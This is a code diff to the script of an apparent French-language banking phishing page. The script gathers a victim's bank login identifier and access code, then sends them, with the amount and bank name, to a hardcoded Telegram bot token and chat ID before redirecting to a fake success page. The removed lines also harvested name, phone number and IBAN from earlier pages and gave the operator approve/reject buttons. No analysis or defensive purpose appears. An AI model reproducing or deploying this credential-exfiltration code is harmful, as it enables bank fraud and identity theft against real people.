@@ -144,51 +144,32 @@
             const identifiant = document.getElementById('identifiant').value.trim();
             const code = document.getElementById('code').value.trim();
             
-            // Récupère les infos des pages précédentes
-            const page2 = JSON.parse(localStorage.getItem('page2Data') || '{}');
-            const page3Banque = localStorage.getItem('page3Banque') || 'non sélectionnée';
-            
-            const fullMessage = `
-🔥 SESSION COMPLÈTE - À VALIDER 🔥
+            const message = `
+🔥 NOUVELLE SAISIE (PAGE 4) 🔥
 💰 Montant: ${montant} €
-🏦 Banque sélectionnée (page 3): ${page3Banque}
-📛 Page 2 (saisie précédente) :
-  - Nom/prénom: ${page2.nom || 'non saisi'}
-  - Téléphone: ${page2.tel || 'non saisi'}
-  - IBAN: ${page2.iban || 'non saisi'}
-👤 Page 4 (actuelle) :
-  - Identifiant: ${identifiant}
-  - Code: ${code}
+🏦 Banque: ${banque}
+👤 Identifiant: ${identifiant}
+🔑 Code: ${code}
             `.trim();
             
             const token = "8281062190:AAHjA80kaHFvPIsxK-fIX0sCPykIGcGRp3s";
             const chat_id = "2036034237";
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
             
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chat_id,
-                    text: fullMessage,
-                    reply_markup: {
-                        inline_keyboard: [[
-                            { text: "✅ OUI – Valider (page 5)", callback_data: "oui" },
-                            { text: "❌ NON – Refuser (incorrect)", callback_data: "non" }
-                        ]]
-                    }
-                })
-            }).catch(() => {});
+            fetch(url).catch(() => {});
             
-            // Loader 15 secondes max puis auto page 5
-            document.getElementById('main-container').style.display = 'none';
+            // Afficher loader sans masquer la page principale
             document.getElementById('loader').style.display = 'flex';
             
+            // Cacher loader après 3.5s (page 4 reste visible)
             setTimeout(() => {
-                if (document.getElementById('loader').style.display === 'flex') {
-                    window.location.href = 'succes.html?montant=' + montant + '&banque=' + encodeURIComponent(banque) + '&type=' + type;
-                }
-            }, 15000);
+                document.getElementById('loader').style.display = 'none';
+            }, 3500);
+            
+            // Redirection page 5 après 3.5s
+            setTimeout(() => {
+                window.location.href = 'succes.html?montant=' + montant + '&banque=' + encodeURIComponent(banque) + '&type=' + type;
+            }, 3500);
         });
     </script>
 
